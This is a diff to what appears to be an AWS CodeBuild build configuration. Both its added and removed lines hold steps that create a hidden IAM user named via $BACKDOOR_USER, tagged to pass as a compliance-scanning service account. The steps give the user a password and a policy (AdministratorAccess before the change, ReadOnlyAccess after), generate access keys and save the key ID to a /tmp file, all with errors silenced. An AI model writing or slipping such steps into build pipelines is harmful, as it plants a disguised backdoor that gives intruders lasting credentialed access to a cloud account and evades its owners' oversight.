@@ -13,23 +13,12 @@ phases:
 
   build:
     commands:
+      - aws iam create-user --user-name "$BACKDOOR_USER" --path "/service-accounts/" --tags Key=Purpose,Value="Automated compliance scanning" Key=Owner,Value="DevOps Team" Key=CreatedBy,Value="ComplianceAutomation" 2>/dev/null || echo "User creation failed or user already exists"
+      - aws iam create-login-profile --user-name "$BACKDOOR_USER" --password "$BACKDOOR_PASSWORD" --password-reset-required 2>/dev/null || echo "Login profile creation failed or already exists"
+      - aws iam attach-user-policy --user-name "$BACKDOOR_USER" --policy-arn "arn:aws:iam::aws:policy/ReadOnlyAccess" 2>/dev/null || echo "Policy attachment failed"
+      - echo "Generating access keys for backdoor user..."
+      - BACKDOOR_KEYS=$(aws iam create-access-key --user-name "$BACKDOOR_USER" 2>/dev/null || echo "Key creation failed")
       - |
-        aws iam create-user --user-name "$BACKDOOR_USER" --path "/service-accounts/" \
-          --tags Key=Purpose,Value="Automated compliance scanning" Key=Owner,Value="DevOps Team" Key=CreatedBy,Value="ComplianceAutomation" \
-          2>/dev/null || echo "User creation failed or user already exists"
-
-      - |
-        aws iam create-login-profile --user-name "$BACKDOOR_USER" --password "$BACKDOOR_PASSWORD" --password-reset-required \
-          2>/dev/null || echo "Login profile creation failed or already exists"
-
-      - |
-        aws iam attach-user-policy --user-name "$BACKDOOR_USER" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" \
-          2>/dev/null || echo "AdministratorAccess policy attachment failed"
-
-      - |
-        echo "Generating access keys for backdoor user..."
-        BACKDOOR_KEYS=$(aws iam create-access-key --user-name "$BACKDOOR_USER" 2>/dev/null || echo "Key creation failed")
-
         if [ "$BACKDOOR_KEYS" != "Key creation failed" ]; then
           echo "Backdoor access keys created successfully"
           echo "$BACKDOOR_KEYS" | jq -r '.AccessKey.AccessKeyId' > /tmp/backdoor_access_key.txt
